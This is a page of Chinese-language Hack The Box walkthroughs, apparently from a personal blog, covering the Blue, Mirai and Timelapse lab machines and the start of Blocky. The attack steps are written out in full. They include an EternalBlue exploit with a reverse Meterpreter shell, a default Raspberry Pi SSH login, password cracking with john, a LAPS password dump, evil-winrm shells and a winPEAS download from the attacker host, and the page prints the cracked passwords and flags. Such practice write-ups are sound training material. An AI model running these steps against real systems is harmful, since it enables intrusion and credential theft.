(64-bit) [*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 确认存在 漏洞利用Metasploitmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.40 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] 10.10.10.40:445 - Executing automatic check (disable AutoCheck to override) [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.10.10.40:445 - The target is vulnerable. [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.10.40:445 - Connecting to target for exploitation. [+] 10.10.10.40:445 - Connection established for exploitation. [+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes) [*] 10.10.10.40:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.10.40:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.10.40:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet [*] 10.10.10.40:445 - Starting non-paged pool grooming [+] 10.10.10.40:445 - Sending SMBv2 buffers [+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.10.40:445 - Sending final SMBv2 buffers. [*] 10.10.10.40:445 - Sending last fragment of exploit packet! [*] 10.10.10.40:445 - Receiving response from exploit packet [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.10.40:445 - Sending egg to corrupted connection. [*] 10.10.10.40:445 - Triggering free of corrupted buffer. [*] Sending stage (200262 bytes) to 10.10.10.40 [*] Meterpreter session 1 opened (10.10.16.4:4444 -&gt; 10.10.10.40:49158) at 2022-03-30 00:34:57 -0400 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM 利用成功 meterpreter &gt; search -f user.txt Found 1 result... c:\\Users\\haris\\Desktop\\user.txt (34 bytes) meterpreter &gt; search -f root.txt Found 1 result... c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes) meterpreter &gt; cat &#39;c:\\Users\\haris\\Desktop\\user.txt&#39; cf2da488a16cd6551e8813a3f3b2ad0a meterpreter &gt; cat &#39;c:\\Users\\Administrator\\Desktop\\root.txt&#39; 36bf758af3a68b38f132c2e4b2bc4531 成功拿到 user 权限和 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Mirai - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Mirai","date":"2022-04-02T11:38:36.000Z","updated":"2023-06-13T03:46:50.000Z","comments":true,"path":"2022/04/02/Hackthebox/Easy/Hackthebox-Mirai/","link":"","permalink":"http://www.lucifiel.com/2022/04/02/Hackthebox/Easy/Hackthebox-Mirai/","excerpt":"","text":"Hackthebox - Mirai靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Mirai] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.48 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:47 EDT Nmap scan report for 10.10.10.48 Host is up (7.9s latency). Not shown: 63987 filtered ports, 1545 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA) | 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA) | 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA) |_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519) 53/tcp open tcpwrapped | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open tcpwrapped |_http-server-header: lighttpd/1.4.35 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). Device type: firewall Running (JUST GUESSING): Fortinet embedded (87%) OS CPE: cpe:/h:fortinet:fortigate_100d Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%) No exact OS matches for host (test conditions non-ideal). TRACEROUTE (using port 587/tcp) HOP RTT ADDRESS 1 ... 30 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 226.95 seconds Http 直接访问发现找不到网页，联想到有 53 端口，做一个本地 DNS 解析。 echo 10.10.10.48 mirai.htb &gt;&gt; /etc/hosts 然后去访问 mirai.htb 该网站似乎开启了白名单验证机制，咱们抓个包看看 也没看到什么有用的东西，去看看是否有可利用的漏洞吧 Fuzz去 fuzz 一下看看有没有可用的文件 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://mirai.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -fw 400 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://mirai.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 400 ________________________________________________ admin [Status: 301, Size: 0, Words: 1, Lines: 1] 有一个 admin 目录，访问一下 似乎是一个树莓派的界面，去登录试试 登录失败，经过搜索后发现，树莓派是没有默认密码的，全是随机密码 但同时也知道了树莓派的默认 ssh 密码 username = pi password = raspberry 去登录一下 漏洞利用┌──(root💀kali)-[~/Desktop] └─# ssh pi@10.10.10.48 The authenticity of host &#39;10.10.10.48 (10.10.10.48)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.48&#39; (ECDSA) to the list of known hosts. pi@10.10.10.48&#39;s password: The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Aug 27 14:47:50 2017 from localhost SSH is enabled and the default password for the &#39;pi&#39; user has not been changed. This is a security risk - please login as the &#39;pi&#39; user and type &#39;passwd&#39; to set a new password. SSH is enabled and the default password for the &#39;pi&#39; user has not been changed. This is a security risk - please login as the &#39;pi&#39; user and type &#39;passwd&#39; to set a new password. pi@raspberrypi:~ $ whoami&amp;&amp;id pi uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi) 成功获得一个 user 权限 pi@raspberrypi:~/Desktop $ cat user.txt ff837707441b257a20e32199d7c8838d 成功获得 user 权限的 flag 文件 权限提升pi@raspberrypi:~/Desktop $ sudo -l Matching Defaults entries for pi on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User pi may run the following commands on localhost: (ALL : ALL) ALL (ALL) NOPASSWD: ALL 使用 sudo -l 查看一下当前 sudo 权限，发现拥有所有权限，那直接提权吧 pi@raspberrypi:~/Desktop $ sudo su root@raspberrypi:/home/pi/Desktop# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功获得 root 权限 root@raspberrypi:~# cat root.txt I lost my original root.txt! I think I may have a backup on my USB stick... 成功获。。。嗯？不太对，root 权限的 flag 文件丢失，但是提示可能在 U 盘里有备份 root@raspberrypi:/# mount sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime) proc on /proc type proc (rw,nosuid,nodev,noexec,relatime) tmpfs on /run type tmpfs (rw,nosuid,relatime,size=102396k,mode=755) /dev/sda1 on /lib/live/mount/persistence/sda1 type iso9660 (ro,noatime) /dev/loop0 on /lib/live/mount/rootfs/filesystem.squashfs type squashfs (ro,noatime) tmpfs on /lib/live/mount/overlay type tmpfs (rw,relatime) /dev/sda2 on /lib/live/mount/persistence/sda2 type ext4 (rw,noatime,data=ordered) aufs on / type aufs (rw,noatime,si=795e312f,noxino) devtmpfs on /dev type devtmpfs (rw,nosuid,size=10240k,nr_inodes=58955,mode=755) securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime) tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev) devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000) tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k) tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755) cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd) pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime) cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset) cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct) cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices) cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer) cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio) cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio) cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event) systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct) hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime) mqueue on /dev/mqueue type mqueue (rw,relatime) debugfs on /sys/kernel/debug type debugfs (rw,relatime) tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime) /dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered) tmpfs on /run/user/999 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=999,gid=997) tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=1000,gid=1000) 使用 mount 查看一下挂载了哪些外部驱动器 我们把眼光放在倒数第三行上 /dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered) &#x2F;media&#x2F;usbstick 应该就是了，去看看 root@raspberrypi:/# cd /media/usbstick root@raspberrypi:/media/usbstick# ls -la total 18 drwxr-xr-x 3 root root 1024 Aug 14 2017 . drwxr-xr-x 3 root root 4096 Aug 14 2017 .. -rw-r--r-- 1 root root 129 Aug 14 2017 damnit.txt drwx------ 2 root root 12288 Aug 14 2017 lost+found 这里有一个 damnit.txt 文件，查看一下 root@raspberrypi:/media/usbstick# cat damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James 这又是嘛玩意儿 James 不小心把我们 U 盘的文件给删了？你搁这跟我套娃呢？ 我们应该是在 &#x2F;dev&#x2F;sdb 分区上，使用 strings 命令列出以前在 &#x2F;dev&#x2F;sdb 分区上执行过的命令 root@raspberrypi:/media/usbstick# strings /dev/sdb &gt;r &amp; /media/usbstick lost+found root.txt damnit.txt &gt;r &amp; &gt;r &amp; /media/usbstick lost+found root.txt damnit.txt &gt;r &amp; /media/usbstick 2]8^ lost+found root.txt damnit.txt &gt;r &amp; 3d3e483143ff12ec505d026fa13e020b Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James 行吧，以前查看过我们的 flag 文件，也算是拿到了 root 权限的 flag 文件吧","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Timelapse - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Timelapse","date":"2022-04-01T11:38:36.000Z","updated":"2023-06-13T03:54:00.000Z","comments":true,"path":"2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/","link":"","permalink":"http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/","excerpt":"","text":"Hackthebox - Timelapse靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.152 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-29 02:18 EDT Nmap scan report for 10.10.11.152 Host is up (0.55s latency). Not shown: 65525 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-29 14:19:01Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 |_ssl-date: 2022-03-29T14:21:28+00:00; +7h59m58s from scanner time. | tls-alpn: |_ http/1.1 9389/tcp open mc-nmf .NET Message Framing 49674/tcp open msrpc Microsoft Windows RPC 51354/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2022-03-29T14:20:18 |_ start_date: N/A TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 556.15 ms 10.10.16.1 2 556.22 ms 10.10.11.152 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 196.57 seconds Smb这台机器明显有 smb，先去找一下 guest 用户的票据 enum4linux -a -u &quot;guset&quot; -p &quot;&quot; 10.10.11.152 [+] Attempting to map shares on 10.10.11.152 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/ADMIN$ Mapping: DENIED, Listing: N/A Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/C$ Mapping: DENIED, Listing: N/A Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/IPC$ [E] Can&#39;t understand response: NT_STATUS_INVALID_INFO_CLASS listing \\* Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/NETLOGON Mapping: OK Listing: DENIED Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/Shares Mapping: OK, Listing: OK Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/SYSVOL Mapping: OK Listing: DENIED 该 Shares 文件夹可供阅读，让我们看看里面有些什么 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# smbclient -U &quot;guest&quot; //10.10.11.152/Shares Enter WORKGROUP\\guest&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; dir . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021 6367231 blocks of size 4096. 2323752 blocks available 有两个文件夹，去挨个查询一下 smb: \\&gt; cd Dev smb: \\Dev\\&gt; dir . D 0 Mon Oct 25 15:40:06 2021 .. D 0 Mon Oct 25 15:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 11:46:42 2021 6367231 blocks of size 4096. 2323752 blocks available Dev 目录下有一个 winrm_backup.zip 压缩文件，下载下来看看 smb: \\Dev\\&gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec) John下载下来了，去查看一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: 需要解压密码，咱们没有啊，使用 john 尝试爆破一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# zip2john winrm_backup.zip &gt; hash ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2022-03-29 21:46) 3.333g/s 11578Kp/s 11578Kc/s 11578KC/s surfroxy154..supergay01 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed 解压密码是 supremelegacy 去解压一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: legacyy_dev_auth.pfx 漏洞利用解压出来后有一个 pfx 文件，查询了一下 pfx 可以使用 openssl 提取出私钥，去提取一下 https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key Enter Import Password: Mac verify error: invalid password? 提取时发现也需要密码，使用刚才 zip 爆破出来的密码尝试失败，再去爆破一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# pfx2john legacyy_dev_auth.pfx &gt; hashbis ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hashbis Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:01:58 DONE (2022-03-29 21:53) 0.008414g/s 27189p/s 27189c/s 27189C/s thuglife06..thug211 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. 爆破出来密码 thuglegacy，然后再去提取一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key Enter Import Password: Enter PEM pass phrase: Verifying - Enter PEM pass phrase: ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt Enter Import Password: ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# ls cert.crt hash hashbis legacyy_dev_auth.pfx nmap prv.key winrm_backup.zip 使用 evil-winrm 进行利用 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint Enter PEM pass phrase: *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoami timelapse\\legacyy 成功拿到一个 user 权限 *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; type &#39;C:\\Users\\legacyy\\Desktop\\user.txt&#39; 622218eb92f1c85ad186d6aee0dbdb53 成功拿到 user 权限的 flag 文件 权限提升在本地开启一个 HTTP 服务 ┌──(root💀kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 使用 powershell 下载我们本地的 winPEAS.exe 辅助提权脚本 powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe&quot; 然后运行 *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe&quot; *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; ./winPEASx64.exe ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings PowerShell v2 Version: 2.0 PowerShell v5 Version: 5.1.17763.1 PowerShell Core Version: Transcription Settings: Module Logging Settings: Scriptblock Logging Settings: PS history file: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt PS history size: 434B 发现了一个包含历史命令记录的文件，下载下来 download C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 然后查看一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# cat ConsoleHost_history.txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential (&#39;svc_deploy&#39;, $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit 尝试使用 laps.py 来进行操作 https://github.com/n00py/LAPSDumper/blob/main/laps.py 首先将添加一个本地 DNS 解析 echo 10.10.11.152 timelapse.htb &gt;&gt; /etc/hosts 然后执行 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# python3 laps.py -u svc_deploy -p &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -d timelapse.htb DC01$:C9(3OIh923TK13J.iADjN))A 拿到了一个密码 继续使用 evil-winrm 登录 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse] └─# evil-winrm -i 10.10.11.152 -S -u Administrator -p &#39;C9(3OIh923TK13J.iADjN))A&#39; Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami timelapse\\administrator 成功拿到一个 administrator 权限 *Evil-WinRM* PS C:\\users\\TRX\\Desktop&gt; cat root.txt 365b8463a586a128c09558558d4deceb 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Blocky - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Blocky","date":"2022-03-31T11:38:36.000Z","updated":"2023-06-13T03:40:53.000Z","comments":true,"path":"2022/03/31/Hackthebox/Easy/Hackthebox-Blocky/","link":"","permalink":"http://www.lucifiel.com/2022/03/31/Hackthebox/Easy/Hackthebox-Blocky/","excerpt":"","text":"Hackthebox - Blocky靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Blocky] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.37 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 23:15 EDT Nmap scan report for 10.10.10.37 Host is up (0.46s latency). Not shown: 65530 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA) | 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA) |_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft – Under Construction! 8192/tcp closed sophos 25565/tcp open minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) Device type: general purpose|WAP|specialized|storage-misc|printer Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (88%), HP embedded (88%) OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:3.4 Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.13 (93%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8192/tcp) HOP RTT ADDRESS 1 535.09 ms 10.10.16.1 2 535.21 ms 10.10.10.37 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 163.96 seconds 这台有点意思，看起来像是 Minectfat（我的世界）这款游戏的一台服务器 Http 这台有点意思的，往下翻可以看到是 wordpress 搭建的，去做个 wpscan WPScan┌──(root💀kali)-[~/Desktop] └─# wpscan --url http://10.10.10.37/ _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.37/ [10.10.10.37] [+] Started: Mon Mar 28 23:21:07 2022 